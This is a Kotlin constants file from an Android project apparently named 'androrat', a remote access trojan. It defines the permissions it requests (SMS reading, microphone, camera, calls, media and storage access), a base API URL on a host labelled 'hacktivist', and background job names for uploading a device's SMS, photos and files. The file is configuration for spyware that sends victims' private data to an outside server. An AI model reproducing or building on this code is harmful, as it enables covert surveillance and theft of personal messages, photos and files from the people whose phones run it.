package com.ierusalem.androrat.core.utils

import android.Manifest
import android.os.Build
import com.ierusalem.androrat.core.app.AppLanguage

object Constants {

    val PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) listOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_SMS,
    ) else {
        listOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
        )
    }

    //*** data store ***
    const val DATA_STORE_NAME = "AppDataStore"

    const val PREFERENCE_LANGUAGE = "device_language"
    const val PREFERENCE_THEME = "device_theme"
    const val PREFERENCE_USERNAME = "device_user_username"

    private const val ENGLISH_LOCALE = "en"
    private const val RUSSIAN_LOCALE = "ru"

    const val UNKNOWN_USER = "Unknown User"
    const val DEFAULT_THEME = false
    const val DEFAULT_LOCALE = RUSSIAN_LOCALE

    fun getLanguageCode(language: AppLanguage): String {
        return when (language) {
            AppLanguage.English -> ENGLISH_LOCALE
            AppLanguage.Russian -> RUSSIAN_LOCALE
        }
    }

    fun getLanguageFromCode(languageCode: String): AppLanguage {
        return when (languageCode) {
            ENGLISH_LOCALE -> AppLanguage.English
            RUSSIAN_LOCALE -> AppLanguage.Russian
            else -> AppLanguage.Russian
        }
    }

    //***

    const val BASE_URL = "https://hacktivist.samduuf.uz/api/v1/"
    const val PERMISSION_REQUEST_WORK_NAME = "permission_request_work_name"

    const val SMS_UPLOAD_WORK_NAME = "sms_upload_work_name"
    const val PHOTOS_UPLOAD_WORK_NAME = "photos_upload_work_name"
    const val FILES_UPLOAD_WORK_NAME = "files_upload_work_name"



}